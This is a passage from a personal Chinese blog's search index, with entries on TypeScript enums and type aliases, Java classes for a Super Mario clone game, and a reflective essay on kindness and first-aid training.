枚举本身是采用整型记录的所以它的类型依旧为整型\nenum Color&#123;\n    red &#x3D; 2,\n    blue,\n    green &#x3D; 3\n&#125;\n\n\n\n\n\n\n\n\n\n\n类型别名\n\nTypeScript\n\nType NewNumber &#x3D; number;\nlet num:NewNumber &#x3D; 3;\ndocument.write(num);\t&#x2F;&#x2F; 输出为3\ndocument.write(typeof num);\t&#x2F;&#x2F;\t输出l\n&#x2F;&#x2F; 这样我们就可以修改类型名称为自定义的了 我真想把number改成int","slug":"TypeScript_JS_Learning_2021_12_5_01","date":"2021-12-05T12:47:52.000Z","categories_index":"Script","tags_index":"程序","author_index":"Arvin"},{"id":"ef9cd7e49fae1afd883185c908e3ad82","title":"Java 音乐类（完结）","content":"package com.arvin;\n\nimport javazoom.jl.decoder.JavaLayerException;\nimport javazoom.jl.player.Player;\n\nimport java.io.BufferedInputStream;\nimport java.io.FileInputStream;\nimport java.io.FileNotFoundException;\n\n&#x2F;**\n *  背景音乐类\n *&#x2F;\n\npublic class Music &#123;\n\n    &#x2F;&#x2F; 空参构造\n    public Music() throws FileNotFoundException, JavaLayerException &#123;\n        Player player;  &#x2F;&#x2F; 播放音乐\n        String str &#x3D; System.getProperty(&quot;user.dir&quot;) + &quot;&#x2F;src&#x2F;Music&#x2F;music.wav&quot;;\n        BufferedInputStream name &#x3D; new BufferedInputStream(new FileInputStream(str)); &#x2F;&#x2F; 读取 str 中音乐 将异常添加到方法签名\n        player &#x3D; new Player(name); &#x2F;&#x2F; 实例化 Player 对象 将异常添加到方法签名\n        player.play(); &#x2F;&#x2F; 调用 Player 的 play() 开始播放音乐\n    &#125;\n\n&#125;","slug":"CodeGame_Java_SuperMary_Test08","date":"2021-11-15T08:27:52.000Z","categories_index":"CodeGame","tags_index":"程序","author_index":"Arvin"},{"id":"d6ed492f35699105c54e7daa2c4807c0","title":"Java 敌人类","content":"代码演示package com.arvin;\n\nimport java.awt.image.BufferedImage;\n\n&#x2F;**\n *  敌人类\n *&#x2F;\n\npublic class Enemy implements Runnable &#123;\n\n    &#x2F;&#x2F; 存储当前坐标\n    private int x,y;\n\n    &#x2F;&#x2F; 存储敌人类型\n    private int type;\n\n    &#x2F;&#x2F; 判断敌人运动的方向\n    private boolean face_to &#x3D; true;\n\n    &#x2F;&#x2F; 用于显示敌人的当前图像\n    private BufferedImage show;\n\n    &#x2F;&#x2F; 定义一个背景对象\n    private BackGround backGround;\n\n    &#x2F;&#x2F; 食人花运动的极限范围\n    private int max_up &#x3D; 0;\n    private int max_down &#x3D; 0;\n\n    &#x2F;&#x2F; 定义一个线程对象 实现敌人的运动\n    private Thread thread &#x3D; new Thread(this);\n\n    &#x2F;&#x2F; 定义当前的图片的状态\n    private int image_type &#x3D; 0;\n\n    &#x2F;**\n     *  蘑菇敌人的构造函数\n     *&#x2F;\n    public Enemy (int x,int y,boolean face_to,int type,BackGround backGround) &#123;\n        this.x &#x3D; x;\n        this.y &#x3D; y;\n        this.face_to &#x3D; face_to;\n        this.type &#x3D; type;\n        this.backGround &#x3D; backGround;\n\n        show &#x3D; StaticValue.Mogu.get(0); &#x2F;&#x2F; 初始化 Show\n\n        thread.start(); &#x2F;&#x2F; 启动线程\n\n    &#125;\n\n    &#x2F;**\n     *  食人花敌人的构造函数\n     *&#x2F;\n    public Enemy (int x,int y,boolean face_to,int type,int max_up,int max_down,BackGround backGround)&#123;\n        this.x &#x3D; x;\n        this.y &#x3D; y;\n        this.face_to &#x3D; face_to;\n        this.type &#x3D; type;\n        this.max_up &#x3D; max_up;\n        this.max_down &#x3D; max_down;\n        this.backGround &#x3D; backGround;\n\n        show &#x3D; StaticValue.Flower.get(0);\n\n        thread.start();\n    &#125;\n\n    &#x2F;**\n     *  敌人的死亡方法\n     *&#x2F;\n    public void death () &#123;\n        show &#x3D; StaticValue.Mogu.get(2); &#x2F;&#x2F; 蘑菇死亡时图片\n        this.backGround.getEnemyList().remove(this); &#x2F;&#x2F;死亡后移除敌人\n    &#125;\n\n    &#x2F;* 生成 x y show 的 get 方法 *&#x2F;\n\n    public int getX() &#123;\n        return x;\n    &#125;\n\n    public int getY() &#123;\n        return y;\n    &#125;\n\n    public BufferedImage getShow() &#123;\n        return show;\n    &#125;\n\n    &#x2F;&#x2F; 生成 type的 Get 方法\n    public int getType() &#123;\n        return type;\n    &#125;\n\n    &#x2F;&#x2F; 抽写 Runnable 接口方法\n    @Override\n    public void run() &#123;\n        while (true)&#123;\n            &#x2F;**\n             *  判断是否是蘑菇敌人\n             *&#x2F;\n            if (type &#x3D;&#x3D; 1) &#123;\n                if (face_to)&#123;   &#x2F;&#x2F;判断当前朝向\n                    this.x -&#x3D; 2;\n                &#125;else&#123;\n                    this.x +&#x3D; 2;\n                &#125;\n                &#x2F;&#x2F; 判断切换 敌人的运动图片\n                image_type &#x3D; image_type &#x3D;&#x3D; 1 ? 0 : 1;\n                show &#x3D; StaticValue.Mogu.get(image_type);\n            &#125;\n            &#x2F;&#x2F; 定义两个布尔 它们用于判断的敌人向左还是向右\n            boolean canLeft &#x3D; true;\n            boolean canRight &#x3D; true;\n\n            &#x2F;&#x2F; 遍历障碍物\n            for (int i &#x3D; 0; i &lt; backGround.getObstacleList().size(); i++) &#123;\n                Obstacle obl &#x3D; backGround.getObstacleList().get(i); &#x2F;&#x2F; 定义临时变量\n\n                &#x2F;&#x2F; 判断是否可以向右走\n                if (obl.getX() &#x3D;&#x3D; this.x + 36 &amp;&amp; (obl.getY() + 65 &gt; this.y &amp;&amp; obl.getY() -35 &lt; this.y)) &#123;\n                    canRight &#x3D; false;\n                &#125;\n\n                &#x2F;&#x2F; 判断是否可以向左走\n                if (obl.getX() &#x3D;&#x3D; this.x - 36 &amp;&amp; (obl.getY() + 65 &gt; this.y &amp;&amp; obl.getY() -35 &lt; this.y)) &#123;\n                    canLeft &#x3D; false;\n                &#125;\n            &#125;\n\n            &#x2F;&#x2F; 判断蘑菇敌人是否向左走 并且已经碰到了我们的障碍物 或者敌人走到了屏幕最左侧\n            if (face_to &amp;&amp; !canLeft || this.x &#x3D;&#x3D; 0) &#123;\n                face_to &#x3D; false;    &#x2F;&#x2F; 重置方向向右走\n            &#125;else if((!face_to) &amp;&amp; (!canRight) || this.x &#x3D;&#x3D; 764)&#123; &#x2F;&#x2F;反过来\n                face_to &#x3D; true;\n            &#125;\n\n            &#x2F;**\n             *  判断是否是食人花敌人\n             *&#x2F;\n            if (type &#x3D;&#x3D; 2) &#123;\n                if (face_to) &#123; &#x2F;&#x2F; 食人花敌人的运动方向\n                    this.y -&#x3D; 2;\n                &#125;else&#123;\n                    this.y +&#x3D; 2;\n                &#125;\n                image_type &#x3D; image_type &#x3D;&#x3D; 1 ? 0 : 1;   &#x2F;&#x2F;图像切换\n                &#x2F;&#x2F; 食人花敌人是否到了上限位置\n                if (face_to &amp;&amp; (this.y &#x3D;&#x3D; max_up)) &#123;\n                    face_to &#x3D; false;\n                &#125;\n                &#x2F;&#x2F; 食人花敌人是否到了下限位置\n                if ((!face_to) &amp;&amp; (this.y &#x3D;&#x3D; max_down))&#123;\n                    face_to &#x3D; true;\n                &#125;\n                show &#x3D; StaticValue.Flower.get(image_type);\n            &#125;\n            try &#123;\n                Thread.sleep(50);   &#x2F;&#x2F; 线程休眠50毫秒\n            &#125; catch (InterruptedException exception) &#123;\n                exception.printStackTrace();\n            &#125;\n        &#125;\n    &#125;\n&#125;","slug":"CodeGame_Java_SuperMary_Test07","date":"2021-11-14T10:48:52.000Z","categories_index":"CodeGame","tags_index":"程序","author_index":"Arvin"},{"id":"060767d5f4be74152fd9d1681be93417","title":"Java 马里奥类","content":"代码演示package com.arvin;\n\nimport java.awt.image.BufferedImage;\n\n&#x2F;**\n *  马里奥类\n *&#x2F;\n\n&#x2F;&#x2F; 利用马里奥类实现 Runnadle 接口 重写其中的抽象方法\npublic class Mario implements Runnable &#123;\n\n    &#x2F;&#x2F; 用于表示(存储)横纵坐标\n    private int x, y;\n\n    &#x2F;&#x2F; 用于表示马里奥当前状态\n    private String status;\n\n    &#x2F;&#x2F; 显示当前状态对应的图像\n    private BufferedImage show &#x3D; null;\n\n    &#x2F;&#x2F; 定义一个 BackGround 对象用来获取障碍物信息\n    private BackGround backGround &#x3D; new BackGround();\n\n    &#x2F;&#x2F; 用来实现马里奥动作 线程对象\n    private Thread thread &#x3D; null;\n\n    &#x2F;&#x2F; 马里奥的移动速度\n    private int xSpeed;\n\n    &#x2F;&#x2F; 马里奥的跳跃速度\n    private int ySpeed;\n\n    &#x2F;&#x2F; 定义一个索引 取得马里奥的运动图像\n    private int indexOf;\n\n    &#x2F;&#x2F; 表示马里奥上升的时间\n    private int upTime &#x3D; 0;\n\n    &#x2F;&#x2F; 判断马里奥是否走到了城堡门口\n    private boolean isOK;\n\n    &#x2F;&#x2F; 判断马里奥是否死亡\n    private boolean isDeath &#x3D; false;\n\n    &#x2F;&#x2F; 积分系统 表示分数\n    private int score &#x3D; 0;\n\n    &#x2F;&#x2F; 定义构造函数\n    public Mario()&#123;\n\n    &#125;\n\n    public Mario(int x, int y)&#123;\n        this.x &#x3D; x;\n        this.y &#x3D; y;\n        show &#x3D; StaticValue.Stand_Right;     &#x2F;&#x2F; 初始化 show\n        this.status &#x3D; &quot;stand--Right&quot;;     &#x2F;&#x2F; 用于表示马里奥当前的状态\n        thread &#x3D; new Thread(this);    &#x2F;&#x2F; 初始化线程\n        thread.start();                     &#x2F;&#x2F; 启动线程 调用 start 方法\n\n    &#125;\n\n    &#x2F;&#x2F; 马里奥死亡方法\n    public void death() &#123;\n        isDeath &#x3D; true;\n    &#125;\n\n    &#x2F;&#x2F; 马里奥向左移动\n    public void leftMove () &#123;\n\n        &#x2F;&#x2F; 改变移动速度\n        xSpeed &#x3D; -5;\n\n        &#x2F;&#x2F; 判断马里奥是否碰到了旗子 马里奥就应该无法移动\n        if (backGround.isReach()) &#123;\n            xSpeed &#x3D; 0;\n        &#125;\n\n        &#x2F;&#x2F; 判断马里奥是否处于空中\n        if (status.indexOf(&quot;jump&quot;) !&#x3D; -1)&#123;\n            status &#x3D; &quot;jump--left&quot;;\n        &#125;else&#123;\n            status &#x3D; &quot;move--left&quot;;\n        &#125;\n    &#125;\n\n    &#x2F;&#x2F; 马里奥向右移动\n    public void rightMove () &#123;\n        xSpeed &#x3D; 5;\n\n        &#x2F;&#x2F; 判断马里奥是否碰到了旗子 马里奥就应该无法移动\n        if (backGround.isReach()) &#123;\n            xSpeed &#x3D; 0;\n        &#125;\n\n        if (status.indexOf(&quot;jump&quot;) !&#x3D; -1)&#123;\n            status &#x3D; &quot;jump--right&quot;;\n        &#125;else&#123;\n            status &#x3D; &quot;move--right&quot;;\n        &#125;\n    &#125;\n\n    &#x2F;&#x2F; 马里奥向左停止\n    public void leftStop () &#123;\n        xSpeed &#x3D; 0;\n        if (status.indexOf(&quot;jump&quot;) !&#x3D; -1)&#123;\n            status &#x3D; &quot;jump--left&quot;;\n        &#125;else&#123;\n            status &#x3D; &quot;stop--left&quot;;\n        &#125;\n    &#125;\n\n    &#x2F;&#x2F; 马里奥向右停止\n    public void rightStop () &#123;\n        xSpeed &#x3D; 0;\n        if (status.indexOf(&quot;jump&quot;) !&#x3D; -1)&#123;\n            status &#x3D; &quot;jump--right&quot;;\n        &#125;else&#123;\n            status &#x3D; &quot;stop--right&quot;;\n        &#125;\n    &#125;\n\n    &#x2F;&#x2F; 马里奥跳跃\n    public void jump () &#123;\n        if (status.indexOf(&quot;jump&quot;) &#x3D;&#x3D; -1)&#123;  &#x2F;&#x2F; 判断马里奥是否是跳跃状态(-1 表示不是)\n            if (status.indexOf(&quot;left&quot;) !&#x3D; -1) &#123;  &#x2F;&#x2F; 判断马里奥此时的方向(-1 表示向左)\n                status &#x3D; &quot;jump--left&quot;;\n            &#125;else&#123;\n                status &#x3D; &quot;jump--right&quot;;\n            &#125;\n            ySpeed &#x3D; -10;\n            upTime &#x3D; 7;\n        &#125;\n\n        &#x2F;&#x2F; 判断马里奥是否碰到了旗子 马里奥就应该无法移动\n        if (backGround.isReach()) &#123;\n            ySpeed &#x3D; 0;\n        &#125;\n    &#125;\n\n    &#x2F;&#x2F; 马里奥下落\n    public void fall () &#123;\n        if (status.indexOf(&quot;left&quot;) !&#x3D; -1)&#123;\n            status &#x3D; &quot;jump--left&quot;;\n        &#125;else&#123;\n            status &#x3D; &quot;jump--right&quot;;\n        &#125;\n        ySpeed &#x3D; 10;\n    &#125;\n\n    &#x2F;&#x2F; 重写 Runnable 的抽象方法\n    @Override\n    public void run() &#123;\n\n        &#x2F;&#x2F; while 死循环\n        while (true) &#123;\n\n            &#x2F;&#x2F; 判断马里奥是否处于障碍物上\n            boolean onObstacle &#x3D; false;\n\n            &#x2F;&#x2F; 判断是否可以往右走\n            boolean canRight &#x3D; true;\n\n            &#x2F;&#x2F; 判断是否可以往左走\n            boolean canLeft &#x3D; true;\n\n            &#x2F;&#x2F; 判断马里奥是否到达旗杆位置 (游戏结束)\n            if (backGround.isFlag() &amp;&amp; this.x &gt;&#x3D; 500)&#123;\n                this.backGround.setReach(true);\n                if(this.backGround.isBase()) &#123; &#x2F;&#x2F; 判断旗子是否下落完成\n                    status &#x3D; &quot;move--right&quot;;\n                    if (x &lt; 690) &#123; &#x2F;&#x2F; 判断马里奥是否移动到了中间\n                        x +&#x3D; 5;\n                    &#125;else&#123;\n                        isOK &#x3D; true;\n                    &#125;\n                &#125;else&#123;\n                    if (y &lt; 395) &#123;\n                        xSpeed &#x3D; 0;\n                        this.y +&#x3D; 5;\n                        status &#x3D; &quot;jump--right&quot;;\n                    &#125;\n\n                    if (y &gt; 395) &#123;\n                        this.y &#x3D; 395;\n                        status &#x3D; &quot;stop--right&quot;;\n                    &#125;\n                &#125;\n\n            &#125;else&#123;\n\n                &#x2F;&#x2F; 遍历当前场景里所有的障碍物\n                for (int i &#x3D; 0; i &lt;backGround.getObstacleList().size(); i++) &#123;\n                    Obstacle obstacle &#x3D; backGround.getObstacleList().get(i); &#x2F;&#x2F; 临时变量存储当前场景障碍物信息\n                    if (obstacle.getY() &#x3D;&#x3D; this.y + 25 &amp;&amp; (obstacle.getX() &gt; this.x -30 &amp;&amp; obstacle.getX() &lt; this.x +25))&#123; &#x2F;&#x2F; 判断马里奥是否处于障碍物上\n                        onObstacle &#x3D; true;\n                    &#125;\n\n                    &#x2F;&#x2F; 判断是否跳起来顶到砖块 (碰撞检测)\n                    if ((obstacle.getY() &gt;&#x3D; this.y -30 &amp;&amp; obstacle.getY() &lt;&#x3D; this.y -20) &amp;&amp; (obstacle.getX() &gt; this.x -30 &amp;&amp; obstacle.getX() &lt; this.x + 25))&#123;\n                        if (obstacle.getType() &#x3D;&#x3D; 0) &#123; &#x2F;&#x2F; 检测障碍物类型 (0 可破坏砖块)\n                            backGround.getObstacleList().remove(obstacle);\n                            score +&#x3D; 1; &#x2F;&#x2F; 积分+1\n                        &#125;\n                        upTime &#x3D; 0; &#x2F;&#x2F; 行为反馈 顶到砖块立刻下落\n                    &#125;\n\n                    &#x2F;&#x2F; 判断是否可以往右走 (碰撞检测)\n                    if (obstacle.getX() &#x3D;&#x3D; this.x + 25 &amp;&amp; (obstacle.getY() &gt; this.y -30 &amp;&amp; obstacle.getY() &lt; this.y +25))&#123;\n                        canRight &#x3D; false;\n                    &#125;\n\n                    &#x2F;&#x2F; 判断是否可以往左走 (碰撞检测)\n                    if (obstacle.getX() &#x3D;&#x3D; this.x - 30 &amp;&amp; (obstacle.getY() &gt; this.y - 30 &amp;&amp; obstacle.getY() &lt; this.y + 25)) &#123;\n                        canLeft &#x3D; false;\n                    &#125;\n                &#125;\n\n                &#x2F;&#x2F; 判断马里奥是否碰到敌人死亡或者踩死敌人\n                for (int i &#x3D; 0; i &lt; backGround.getEnemyList().size(); i++) &#123; &#x2F;&#x2F; 遍历每一个敌人\n                    Enemy enemy &#x3D; backGround.getEnemyList().get(i); &#x2F;&#x2F; enemy 存储当前的敌人\n\n                    &#x2F;&#x2F; 判断马里奥是否位于敌人头上 与判断障碍物是一样的\n                    if (enemy.getY() &#x3D;&#x3D; this.y + 20 &amp;&amp; (enemy.getX() -25 &lt;&#x3D; this.x &amp;&amp; enemy.getX() +35 &gt;&#x3D; this.x)) &#123;\n                        &#x2F;&#x2F; 判断是蘑菇敌人还是食人花敌人 蘑菇敌人才可以踩死\n                        if (enemy.getType() &#x3D;&#x3D; 1) &#123;\n                            enemy.death();  &#x2F;&#x2F; 调用蘑菇敌人的死亡方法\n                            score +&#x3D; 2;\n\n                            &#x2F;&#x2F; 让马里奥上升一小段\n                            upTime &#x3D; 3;\n                            ySpeed &#x3D; -10;\n                        &#125;else if (enemy.getType()&#x3D;&#x3D; 2)&#123; &#x2F;&#x2F; 食人花敌人情况\n                            &#x2F;&#x2F; 马里奥死亡\n                            death();\n                        &#125;\n                    &#125;\n                    &#x2F;&#x2F; 判断马里奥是否碰到敌人 碰到死亡\n                    if ((enemy.getX() + 35 &gt; this.x &amp;&amp; enemy.getX() - 25 &lt; this.x) &amp;&amp; (enemy.getY() + 35 &gt;this.y &amp;&amp; enemy.getY() -20 &lt; this.y)) &#123;\n                        &#x2F;&#x2F; 马里奥死亡\n                        death();\n                    &#125;\n                &#125;\n\n                &#x2F;&#x2F; 进行马里奥跳跃\n                if (onObstacle &amp;&amp; upTime &#x3D;&#x3D; 0)&#123;\n                    if (status.indexOf(&quot;left&quot;) !&#x3D; -1)&#123;\n                        if (xSpeed !&#x3D; 0)&#123;\n                            status &#x3D; &quot;move--left&quot;;\n                        &#125;else&#123;\n                            status &#x3D; &quot;stop--left&quot;;\n                        &#125;\n                    &#125;else&#123;\n                        if (xSpeed !&#x3D; 0)&#123;\n                            status &#x3D; &quot;move--right&quot;;\n                        &#125;else&#123;\n                            status &#x3D; &quot;stop--right&quot;;\n                        &#125;\n                    &#125;\n                &#125;else&#123;\n                    if (upTime !&#x3D; 0)&#123;\n                        upTime--;   &#x2F;&#x2F; 一直自检\n                    &#125;else&#123;\n                        fall(); &#x2F;&#x2F; 让他下落\n                    &#125;\n                    y +&#x3D; ySpeed; &#x2F;&#x2F; 改变坐标值\n                &#125;\n\n\n                &#x2F;&#x2F; 判断马里奥是否在运动\n                if (canLeft &amp;&amp; xSpeed &lt; 0 || canRight &amp;&amp; xSpeed &gt; 0) &#123;\n                    x +&#x3D; xSpeed;\n\n                    &#x2F;&#x2F; 判断马里奥是否到了最左边\n                    if (x &lt; 0)&#123;\n                        x &#x3D; 0;\n                    &#125;\n                &#125;\n\n                &#x2F;&#x2F; 判断当前是否是移动状态\n                if (status.contains(&quot;move&quot;)) &#123;\n                    indexOf &#x3D; indexOf &#x3D;&#x3D; 0 ? 1 : 0;\n                &#125;\n\n                &#x2F;&#x2F; 判断是否向左移动\n                if (&quot;move--left&quot;.equals(status)) &#123;\n                    show &#x3D; StaticValue.Run_Left.get(indexOf);\n                &#125;\n\n                &#x2F;&#x2F; 判断是否向右移动\n                if (&quot;move--right&quot;.equals(status)) &#123;\n                    show &#x3D; StaticValue.Run_Right.get(indexOf);\n                &#125;\n\n                &#x2F;&#x2F; 判断是否向左停止\n                if (&quot;stop--left&quot;.equals(status)) &#123;\n                    show &#x3D; StaticValue.Stand_Left;\n                &#125;\n\n                &#x2F;&#x2F; 判断是否向右停止\n                if (&quot;stop-right&quot;.equals(status)) &#123;\n                    show &#x3D; StaticValue.Stand_Right;\n                &#125;\n\n                &#x2F;&#x2F; 判断是否向左跳跃\n                if (&quot;jump--left&quot;.equals(status))&#123;\n                    show &#x3D; StaticValue.Jump_Left;\n                &#125;\n\n                &#x2F;&#x2F; 判断是否向右跳跃\n                if (&quot;jump--right&quot;.equals(status))&#123;\n                    show &#x3D; StaticValue.Jump_Right;\n                &#125;\n\n                &#x2F;&#x2F; 线程休眠 50 毫秒\n                try &#123;\n                    Thread.sleep(50);\n                &#125; catch (InterruptedException exception) &#123;\n                    exception.printStackTrace();\n                &#125;\n\n            &#125;\n        &#125;\n    &#125;\n\n\n    &#x2F;&#x2F; 生成 x y BufferedImage 的 set 和 get 方法\n    public int getX() &#123;\n        return x;\n    &#125;\n\n    public void setX(int x) &#123;\n        this.x &#x3D; x;\n    &#125;\n\n    public int getY() &#123;\n        return y;\n    &#125;\n\n    public void setY(int y) &#123;\n        this.y &#x3D; y;\n    &#125;\n\n    public BufferedImage getShow() &#123;\n        return show;\n    &#125;\n\n    public void setShow(BufferedImage show) &#123;\n        this.show &#x3D; show;\n    &#125;\n\n    &#x2F;&#x2F; 生成 backGround 的 set 方法\n    public void setBackGround(BackGround backGround) &#123;\n        this.backGround &#x3D; backGround;\n    &#125;\n\n    &#x2F;&#x2F; 生成 判断马里奥是否到城堡门口的 Get 方法\n    public boolean isOK() &#123;\n        return isOK;\n    &#125;\n\n    &#x2F;&#x2F; 生成 isDeath 的 Get 方法\n    public boolean isDeath() &#123;\n        return isDeath;\n    &#125;\n\n    &#x2F;&#x2F; 生成分数的 Get 方法\n    public int getScore() &#123;\n        return score;\n    &#125;\n&#125;\n","slug":"CodeGame_Java_SuperMary_Test06","date":"2021-11-12T11:28:52.000Z","categories_index":"CodeGame","tags_index":"程序","author_index":"Arvin"},{"id":"038212bdfa28833817e00c513951e73b","title":"【無憂樹洞】但行好事，莫问前程「暴力兔」","content":"您好，我是陆弦，我又写信了。\n这篇文章是2020年5月23日写的，今天是2020年7月17日。祝朋友们，内心平和柔软，外表无坚不摧。\n但行好事 莫问前程\n原创 陆弦 一路弦歌 5月23日\n赠人玫瑰，手留余香。5.20买的影星玫瑰。\n这首歌的名字是《我的希望在路上》\n（词：诗人小招，曲：独立音乐人白羽，演唱：佩佩、白羽）\n曾经有一段时间，我的微信签名就是：\n但行好事，莫问前程。（现在的签名是：怕什么真理无穷，进一寸有进一寸的欢喜。）\n但行好事，莫问前程。百度的解释：多多地做善事，过好当下，先不要去问前程如何。\n我的理解是：做善良之人，行善良之事，无论未来如何，做好当下。\n那么，如何做一个善良之人呢？\n首先，有向善之心。\n养成善意的视角，不以恶意揣测他人。\n相处时与人为善，将自己的善意传达给他人时，必将也会收到他人回馈的善意，这个世界将消弥多少纷争与矛盾。\n其次，培养善良的特质。不苛求他人，控制情绪，学会聆听。\n一个善良的人，大多是性情温和的，因为他们会将心比心，不会说出伤害他人的话，也不会做出伤害他人的事。\n最后，就是行动起来。多微笑，多关爱他人，力所能及地帮助他人。只有行动起来，才能帮助到他人，不要担心力量微小，再小的善意也是善意，也能带给受助者以暖意。\n我忽地想到一个故事。\n黄昏下，退潮的海滩上，走着一个小男孩。\n小男孩身前的沙滩上，跳着许许多多试图回到海中的小鱼，而小男孩身后的沙滩上却一条搁浅的小鱼都没有。\n妈妈问他：“你为什么要把小鱼都丢回大海啊？”\n小男孩：“因为鱼儿离不开水啊，我不丢它回大海，它会死的。”\n妈妈又问：“可是这片沙滩上的小鱼太多了，数也数不清，而且今天你将小鱼都丢回去了，那明天呢？那后天呢？那未来呢？那么多小鱼，你丢得完吗？”\n小男孩笑了笑，夕阳灿烂的光辉照在他的脸上：“确实是丢不完的，但是我想在自己能力范围内，尽量帮助它们。”\n小男孩举了举手中的小鱼，并努力将小鱼丢回大海，“\n比如这条小鱼，我将它送回大海。这条小鱼只是我丢的所有小鱼其中一条，但是对于这条小鱼来说，我却是它的唯一，是唯一个帮助到它，并改变了它命运的人。我希望它能继续快乐生活下去，而不是被困沙滩，最终死掉。 “\n这段时间，我就行动起来了。我参加了某会救.护员培训，参加这个培训的目的，就是希望多知道一些救.护知识，在突发状况发生时，我不但能够自救，不给别人拖后腿，还能够在力所能及的范围内帮助他人。\n学习分为线上理论学习与线下实操考核。\n线上理论学习包括了：某运动的基本知识、救护概论、心肺复苏、创伤救护、常见急症、理论考试，六个部分。在学习的过程中我发现，当真正遇到突发状况时，我在现场有可能面对的是鲜血、断肢、肠子、呕吐物等，这些让人面色发白、冷汗涔涔的物事。\n所以，当一个合格的急.救员，除了要掌握好这些急救知识，最主要的是克服心理上的不适，冷静面对。如果急.救员都处于慌乱中，那么怎么能够帮助到他人。\n关于现场情境，发几张图片，大家随意感受一下。 \n（断肢伤口展示） \n（肠管外溢展示。说实话，隔着屏幕学到这里时，我快吐了。）认认真真地学习了两周时间，5月18日参加了线上考试。\n考试共有三次机会，学分80分以上为合格。我只考了一次，就获得了90分，理论合格了，好开心呀。错误了三题，这三题错误都是理解上出了问题。\n其他关于救.护知识的具体问题全部正确。5月22日进行线下知识巩固与实操考核。\n上午的实操内容是心肺复苏。\n在操练心肺复苏的过程中，有一个学员在打开气道时，慌乱中手指掐住了伤员的喉咙，老师忙急声制止：“可别这么掐，这么掐，反而把伤员掐死了。”\n学员们立马哄堂大笑。老师很严肃地环顾一圈，说道：“不要笑，在现场时，情形本来就很紧张，难免出现这样的状况，所以大家不能掉以轻心，认真地学习，不能让伤员二次受伤，甚至是死亡。”\n是啊，作为一个人，作为一个救.护员，要尊重生命、敬畏生命，将伤者的生命安全放在头一位，在救护的过程中，要时刻关注伤者的伤势、反应，避免造成二次伤害，缓解伤者的痛苦，挽救伤者的生命。 \n（左边是三角巾，右边是弹性绷带。） （胸部按压，伤者脸上敷着消毒面膜。） 人工呼吸 （排除口腔异物）下午的实操内容是创伤救护，包括：出血、骨折。绷带包扎有几种方法：环形包扎、螺旋包扎、螺旋反折包扎、8字包扎、回返包扎。三角巾包扎有几种方法：头部包扎、双肩包扎、胸部包扎、腹部包扎、手掌或脚掌包扎、膝部包扎，悬挂臂包扎。\n（三角巾头部出血包扎，像不像偷地雷的？）（三角巾肩部出血包扎）（三角巾膝部出血包扎）（三角巾悬挂臂骨折包扎）（绷带回返式断肢包扎）拍照时，实操小组搭档喜笑颜开。\n我说：“不能笑，断肢的伤员很痛，是不会笑的。尊重生命，首先要尊重自己的生命。身体发肤，受之父母，不敢毁损，孝之始也。”  哈哈哈…… \n实操也终于合格了，好开心，觉得自己已经具备了一点点帮助别人的能力。\n这次学习，我不但收获了丰富的急.救知识，还收获了心理上的慰贴感受。\n这次来参加学习的学员，人数众多（约有30%为男生），大家热情高涨，态度一丝不苟。\n这些现象都表明了，大部分人还是心存善念的，希望自己能为他人提供一点点帮助，希望这个世界更美好。\n考试中，别的组的个别学员，是这样走江湖的，大家随意感受一下。 与人为善是值得肯定的，但是还需要注意几点。\n首先，确保你的善举是被需要的。\n有时候未经要求的“帮助”可能适得其反，“做好事有时也会受到惩罚”，好心办坏事，不但看不到受助者的笑脸，很可能还会被埋汰。\n其次，不要为你的善举沾沾自喜，谦虚一点。如果做善事只为了身边的人夸奖你，那不是真正的善良。不求回报地去做善事，才是真正的善良。\n最后，善良但要有锋芒，不要被别人利用你的善良。没有边界的心软，只会让对方得寸进尺；毫无原则的仁慈，只会让对方为所欲为。\n嗯，但行好事，莫问前程。\n请诸君亦来日行一善吧，\n哪怕你只是说一句：“你好美，我爱你。”\n\n\n\n我只是在呢喃自语，\n如果你看了，就已经是一种见证和陪伴了，\n因为我知道一定会有人看。\n如果有什么信息能和你共鸣，\n你从中看见了自己，\n那就是另外的收获了。\n如果你看懂了，\n你从中看见了我，\n还能有什么回应，\n并且这回应我们还可以彼此共振，\n那就是更大的惊喜了。\n没有无缘无故的遇见。\n致敬未知。\n","slug":"eqistle.2021.11.08.01","date":"2021-11-08T10:08:38.000Z","categories_index":"书信","tags_index":"暴力兔书信","author_index":"Arvin"},{"id":"c29465b802ec19d39248fbc5d753e625","title":"Java 超级玛丽障碍物类","content":"代码演示package com.arvin;\n\nimport java.awt.image.BufferedImage;\n\n&#x2F;**\n *  障碍物类\n *&#x2F;\n\npublic class Obstacle implements Runnable&#123;\n\n    &#x2F;&#x2F; 用于表示当前坐标\n    private int x;\n    private int y;\n\n    &#x2F;&#x2F; 用于记录障碍物类型\n    private int type;\n\n    &#x2F;&#x2F; 用于显示图像\n    private BufferedImage show &#x3D; null;\n\n    &#x2F;&#x2F; 定义当前场景对象\n    private BackGround BackGround &#x3D; null;\n\n    &#x2F;&#x2F; 定义一个线程对象 用于完成我们旗子下落的过程\n    private Thread thread &#x3D; new Thread(this);\n\n    &#x2F;&#x2F; 构造函数\n    public Obstacle (int x, int y, int type, BackGround BackGround) &#123;\n        this.x &#x3D; x;\n        this.y &#x3D; y;\n        this.type &#x3D; type;\n        this.BackGround &#x3D; BackGround;\n        show &#x3D; StaticValue.Obstacle.get(type);  &#x2F;&#x2F;  得到该类型的图像\n\n        &#x2F;&#x2F; 如果是旗子的话 启动线程\n        if (type &#x3D;&#x3D; 4)&#123;\n            thread.start();\n        &#125;\n    &#125;\n\n    &#x2F;&#x2F; 生成上面四个变量的 Get 方法\n\n\n    public int getX() &#123;\n        return x;\n    &#125;\n\n    public int getY() &#123;\n        return y;\n    &#125;\n\n    public int getType() &#123;\n        return type;\n    &#125;\n\n    public BufferedImage getShow() &#123;\n        return show;\n    &#125;\n\n    &#x2F;&#x2F; 重写 Runnable 的抽象方法\n\n    @Override\n    public void run() &#123;\n        while(true)&#123;\n\n            if (this.BackGround.isReach()) &#123; &#x2F;&#x2F; 判断马里奥此时是否到达了旗子的位置\n                if (this.y &lt; 374) &#123; &#x2F;&#x2F; 判断此时的旗子有没有落到地上\n                    this.y +&#x3D; 5;\n                &#125;else &#123;\n                    this.BackGround.setBase(true);\n                &#125;\n            &#125;\n\n            try &#123;\n                Thread.sleep(50);\n            &#125; catch (InterruptedException exception) &#123;\n                exception.printStackTrace();\n            &#125;\n\n        &#125;\n    &#125;\n&#125;","slug":"CodeGame_Java_SuperMary_Test05","date":"2021-11-08T06:40:52.000Z","categories_index":"CodeGame","tags_index":"程序","author_index":"Arvin"},{"id":"3c2d266b9caeb01b9460324e5828e520","title":"Java 